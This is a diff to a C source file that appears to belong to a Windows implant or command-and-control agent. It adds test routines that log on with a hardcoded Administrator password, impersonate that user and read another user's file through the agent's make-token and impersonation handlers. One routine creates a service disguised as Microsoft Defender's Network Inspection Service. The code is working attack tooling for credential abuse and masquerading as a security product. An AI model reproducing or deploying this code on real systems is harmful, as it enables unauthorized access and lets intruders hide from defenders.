@@ -2315,6 +2315,105 @@ void test138(void) {
 	PrintFormatA("Path: %s\n", __FILE__);
 }
 
+void test139(void) {
+	HANDLE hToken = NULL;
+	STARTUPINFOW StartupInfo;
+	PROCESS_INFORMATION ProcInfo;
+	PROFILEINFOA ProfileInfo;
+
+	if (!LogonUserW(L"DESKTOP-VEJKA7R\\Administrator", NULL, L"Caydabode1", LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_WINNT50, &hToken)) {
+		LOG_ERROR("LogonUserW", GetLastError());
+		return;
+	}
+
+	PrintFormatA("hToken: 0x%08x\n", hToken);
+	if (!ImpersonateLoggedOnUser(hToken)) {
+		LOG_ERROR("ImpersonateLoggedOnUser", GetLastError());
+		return;
+	}
+
+	SecureZeroMemory(&StartupInfo, sizeof(StartupInfo));
+	SecureZeroMemory(&ProcInfo, sizeof(ProcInfo));
+	SecureZeroMemory(&ProfileInfo, sizeof(ProfileInfo));
+	ProfileInfo.dwSize = sizeof(ProfileInfo);
+	ProfileInfo.lpUserName = DuplicateStrA("DESKTOP-VEJKA7R\\Administrator", 0);
+	if (!LoadUserProfileA(hToken, &ProfileInfo)) {
+		PrintFormatA("0x%08x\n", GetLastError());
+	}
+}
+
+void test140(void) {
+	ImpersonateUser("DESKTOP-VEJKA7R\\Administrator");
+}
+
+void test141(void) {
+	ENVELOPE Envelope;
+	PPBElement ReqElement = NULL;
+	LPSTR lpFileData = NULL;
+
+	SecureZeroMemory(&Envelope, sizeof(Envelope));
+	ReqElement = CreateBytesElement("DESKTOP-VEJKA7R\\Administrator", lstrlenA("DESKTOP-VEJKA7R\\Administrator"), 1);
+	Envelope.uType = MsgImpersonateReq;
+	Envelope.pData = ALLOC(sizeof(BUFFER));
+	Envelope.pData->pBuffer = ReqElement->pMarshaledData;
+	Envelope.pData->cbBuffer = ReqElement->cbMarshaledData;
+
+	ImpersonateHandler(&Envelope, NULL);
+	lpFileData = ReadFromFile(L"C:\\Users\\Admin\\Desktop\\Hello.txt", NULL);
+	if (lpFileData != NULL) {
+		PrintFormatA("lpFileData: %s\n", lpFileData);
+	}
+}
+
+void test142(void) {
+	ENVELOPE Envelope;
+	PPBElement ReqElements[4];
+	PPBElement pMarshaledData = NULL;
+	LPSTR lpFileData = NULL;
+
+	SecureZeroMemory(&Envelope, sizeof(Envelope));
+	SecureZeroMemory(ReqElements, sizeof(ReqElements));
+	ReqElements[0] = CreateBytesElement("Administrator", lstrlenA("Administrator"), 1);
+	ReqElements[1] = CreateBytesElement("Caydabode1", lstrlenA("Caydabode1"), 2);
+	ReqElements[3] = CreateVarIntElement(LOGON32_LOGON_INTERACTIVE, 4);
+	pMarshaledData = CreateStructElement(ReqElements, _countof(ReqElements), 0);
+	Envelope.uType = MsgImpersonateReq;
+	Envelope.pData = ALLOC(sizeof(BUFFER));
+	Envelope.pData->pBuffer = pMarshaledData->pMarshaledData;
+	Envelope.pData->cbBuffer = pMarshaledData->cbMarshaledData;
+
+	MakeTokenHandler(&Envelope, NULL);
+	lpFileData = ReadFromFile(L"C:\\Users\\Admin\\Desktop\\Hello.txt", NULL);
+	if (lpFileData != NULL) {
+		PrintFormatA("lpFileData: %s\n", lpFileData);
+	}
+}
+
+void test143(void) {
+	ENVELOPE Envelope;
+	PPBElement ReqElements[7];
+	PPBElement pMarshaledData = NULL;
+	CHAR szServiceName[] = "WdNisSvc1";
+	CHAR szServiceDesc[] = "Helps guard against intrusion attempts targeting known and newly discovered vulnerabilities in network protocols";
+	CHAR szBinPath[] = "\"C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.24020.7-0\\NisSrv.exe\"";
+	CHAR szDisplayName[] = "Microsoft Defender Antivirus Network Inspection Service";
+
+	SecureZeroMemory(&Envelope, sizeof(Envelope));
+	SecureZeroMemory(ReqElements, sizeof(ReqElements));
+	ReqElements[0] = CreateBytesElement(szServiceName, lstrlenA(szServiceName), 1);
+	ReqElements[1] = CreateBytesElement(szServiceDesc, lstrlenA(szServiceDesc), 2);
+	ReqElements[2] = CreateBytesElement(szBinPath, lstrlenA(szBinPath), 3);
+	ReqElements[4] = CreateBytesElement(szDisplayName, lstrlenA(szDisplayName), 5);
+	ReqElements[5] = CreateVarIntElement(SERVICE_WIN32_OWN_PROCESS, 6);
+	ReqElements[6] = CreateVarIntElement(SERVICE_DISABLED, 7);
+	pMarshaledData = CreateStructElement(ReqElements, _countof(ReqElements), 0);
+	Envelope.pData = ALLOC(sizeof(BUFFER));
+	Envelope.pData->pBuffer = pMarshaledData->pMarshaledData;
+	Envelope.pData->cbBuffer = pMarshaledData->cbMarshaledData;
+
+	CreateServiceHandler(&Envelope);
+}
+
 BOOL IsExist
 (
 	PGLOBAL_CONFIG pConfig
@@ -2435,6 +2534,7 @@ VOID Final(VOID)
 	InitializeSRWLock(&pGlobalConfig->RWLock);
 	pGlobalConfig->uPeerID = GeneratePeerID();
 	pGlobalConfig->dwListenerID = 1;
+	pGlobalConfig->hCurrentToken = GetCurrentProcessToken();
 	if (IsExist(pGlobalConfig)) {
 		goto CLEANUP;
 	}
@@ -2742,6 +2842,11 @@ int WinMain
 	//test136();
 	//test137();
 	//test138();
+	//test139();
+	//test140();
+	//test141();
+	//test142();
+	//test143();
 	Final();
 	//WaitForSingleObject(hThread, INFINITE);
 CLEANUP:
